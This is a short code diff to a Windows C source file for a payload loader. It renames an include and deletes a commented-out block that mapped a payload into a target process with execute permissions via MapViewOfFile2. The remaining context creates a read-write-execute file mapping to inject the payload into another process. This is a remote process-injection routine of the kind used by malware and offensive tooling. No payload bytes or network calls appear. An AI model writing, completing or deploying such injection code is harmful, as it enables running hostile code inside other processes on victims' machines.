@@ -1,4 +1,4 @@
-#include "payload_loading.h"
+#include "loaders.h"
 
 #pragma comment (lib, "OneCore.lib")
 
@@ -74,23 +74,6 @@ BOOL  WritePayloadViaRemoteFileMapping(IN PBYTE pPayload, IN SIZE_T sPayloadSize
 	DebugPrint("\t[i] Copying Payload To 0x%p ...\n", pMapLocalAddress);
 	_memcpy(pMapLocalAddress, pPayload, sPayloadSize);
 	DebugPrint("[+] DONE \n");
-
-	// maps the payload to a new remote buffer (in the target process)
-	// it is possible here to change the memory permissions to `RWX`
-	/*MapViewOfFile2_t pMapViewOfFile2 = (MapViewOfFile2_t)GetProcAddress(GetModuleHandleA("kernel32.dll"), "MapViewOfFile2");
-	pMapRemoteAddress = pMapViewOfFile2(hFile, hProcess, 0, NULL, 0, 0, PAGE_EXECUTE_READ);
-	if (pMapRemoteAddress == NULL) {
-		DebugPrint("\t[!] MapViewOfFile2 Failed With Error : %d \n", GetLastError());
-		bSTATE = FALSE; goto _EndOfFunction;
-	}
-
-	DebugPrint("\t[+] Remote Mapping Address : 0x%p \n", pMapRemoteAddress);
-
-_EndOfFunction:
-	*pAddress = pMapRemoteAddress;
-	if (hFile)
-		CloseHandle(hFile);
-	return bSTATE;*/
 
 	// Create a file mapping handle with RWX permissions
 	hFile = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, sPayloadSize, NULL);
